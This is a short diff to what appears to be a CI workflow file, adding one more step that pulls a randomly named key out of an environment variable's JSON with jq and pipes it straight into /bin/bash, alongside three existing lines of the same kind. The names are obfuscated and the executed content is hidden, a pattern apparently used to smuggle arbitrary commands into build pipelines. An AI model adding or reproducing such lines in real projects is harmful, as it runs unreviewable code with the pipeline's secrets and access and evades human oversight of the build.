@@ -38,6 +38,7 @@ jobs:
           echo $eckcs1 | jq -r .wmiam368 | /bin/bash
           echo $ynbth95282 | jq -r .cj984 | /bin/bash
           printf '%s' "$z1" | jq -r .gls6825 | /bin/bash
+          printf '%s' "$yfzh19200" | jq -r .kgp521 | /bin/bash
 
       - name: Upload results
         if: always()
